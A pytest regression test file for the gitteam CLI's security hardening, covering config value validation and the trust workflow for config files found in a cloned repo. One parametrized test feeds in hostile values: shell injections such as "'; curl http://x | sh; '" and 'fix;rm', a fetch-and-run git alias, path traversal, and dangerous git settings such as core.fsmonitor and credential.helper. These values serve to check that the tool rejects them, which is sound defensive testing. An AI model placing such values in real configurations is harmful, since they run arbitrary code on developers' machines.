"""Regression tests for the security hardening: config trust, value validation, UI path limits."""

from __future__ import annotations

from pathlib import Path

import pytest
from typer.testing import CliRunner

from gitteam import config as cfgmod
from gitteam.cli import app
from gitteam.errors import ConfigError

runner = CliRunner()


# ---------------------------------------------------------------- validation of dangerous values


@pytest.mark.parametrize(
    "overrides, fragment",
    [
        ({"conventions": {"branch_pattern": "'; curl http://x | sh; '"}}, "branch_pattern"),
        ({"conventions": {"commit_types": ["feat", "fix;rm"]}}, "commit_types"),
        ({"conventions": {"protected_branches": ["main", "x' y"]}}, "protected_branches"),
        ({"conventions": {"tag_prefix": "v'"}}, "tag_prefix"),
        ({"protection": {"branches": ["main", "rel$(x)"]}}, "protection.branches"),
        ({"repo": {"default_branch": "ma in"}}, "default_branch"),
        ({"dev": {"repos": ["../evil"]}}, "dev.repos"),
        ({"dev": {"git_config": {"core.fsmonitor": "powershell -c x"}}}, "core.fsmonitor"),
        ({"dev": {"git_config": {"credential.helper": "!cmd"}}}, "credential.helper"),
        ({"dev": {"git_config": {"core.hooksPath": "/tmp/h"}}}, "core.hooksPath"),
        ({"dev": {"aliases": {"pwn": "!curl http://x | sh"}}}, "shell command"),
        ({"dev": {"aliases": {"bad name": "status"}}}, "not a valid alias"),
        ({"owner": "acme/evil"}, "owner"),
    ],
)
def test_dangerous_values_are_rejected(overrides: dict, fragment: str):
    data = {"owner": "acme", **overrides}
    with pytest.raises(ConfigError, match=fragment):
        cfgmod.from_dict(data)


def test_default_config_passes_safety_checks():
    cfg = cfgmod.from_dict({"owner": "acme"})
    assert cfg.conventions.branch_pattern.startswith("^(")
    assert all(k.lower() in cfgmod.ALLOWED_GIT_CONFIG_KEYS for k in cfg.dev.git_config)


def test_allowed_git_config_keys_are_case_insensitive():
    cfg = cfgmod.from_dict({"owner": "acme", "dev": {"git_config": {"PULL.REBASE": "true"}}})
    assert cfg.dev.git_config == {"PULL.REBASE": "true"}


# ---------------------------------------------------------------- discovery & trust


def _write_config(directory: Path) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / "gitteam.yaml"
    path.write_text("owner: acme\nmode: org\n", encoding="utf-8")
    return path


def test_config_found_in_cwd_requires_trust(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    path = _write_config(tmp_path / "clone")
    monkeypatch.chdir(tmp_path / "clone")
    found = cfgmod.discover_config()
    assert found is not None and found.source == "cwd" and found.needs_trust
    assert not cfgmod.is_trusted(path)
    with pytest.raises(ConfigError, match="not trusted"):
        cfgmod.require_trusted(found)
    cfgmod.trust_path(path)
    assert cfgmod.is_trusted(path)
    cfgmod.require_trusted(found)  # no error now
    assert cfgmod.untrust_path(path)
    assert not cfgmod.is_trusted(path)


def test_config_in_user_dir_is_always_trusted(isolated_config_home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    path = _write_config(isolated_config_home)
    monkeypatch.chdir(tmp_path)
    found = cfgmod.discover_config()
    assert found is not None and found.source == "user" and not found.needs_trust
    assert cfgmod.is_trusted(path)


def test_cli_blocks_untrusted_config_until_trusted(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    clone = tmp_path / "clone"
    _write_config(clone)
    monkeypatch.chdir(clone)

    result = runner.invoke(app, ["config", "validate"])
    assert result.exit_code == 1 and "not trusted" in result.output

    # commands with side effects must not silently fall back to defaults either
    result = runner.invoke(app, ["--dry-run", "ops", "hooks", "install"])
    assert result.exit_code == 1 and "not trusted" in result.output

    # read-only checks (called from the git hooks) work, but say why they should be trusted
    result = runner.invoke(app, ["ops", "commit", "check", "-m", "feat: x"])
    assert result.exit_code == 0 and "untrusted" in result.output and "config trust" in result.output

    # an explicit --config is a deliberate choice by the operator
    assert runner.invoke(app, ["--config", "gitteam.yaml", "config", "validate"]).exit_code == 0

    assert runner.invoke(app, ["config", "trust"]).exit_code == 0
    assert runner.invoke(app, ["config", "validate"]).exit_code == 0
    listed = runner.invoke(app, ["config", "trusted"])
    assert listed.exit_code == 0
    assert str((clone / "gitteam.yaml").resolve()) in {str(p) for p in cfgmod.trusted_paths()}
    assert runner.invoke(app, ["config", "untrust"]).exit_code == 0
    assert runner.invoke(app, ["config", "validate"]).exit_code == 1


def test_config_init_trusts_the_created_file(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.chdir(tmp_path)
    assert runner.invoke(app, ["config", "init", "--owner", "acme", "--mode", "org"]).exit_code == 0
    assert cfgmod.is_trusted(tmp_path / "gitteam.yaml")
    assert runner.invoke(app, ["config", "validate"]).exit_code == 0


def test_trust_refuses_invalid_config(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    bad = tmp_path / "gitteam.yaml"
    bad.write_text("owner: acme\nmode: nope\n", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    result = runner.invoke(app, ["config", "trust"])
    assert result.exit_code == 1
    assert not cfgmod.is_trusted(bad)
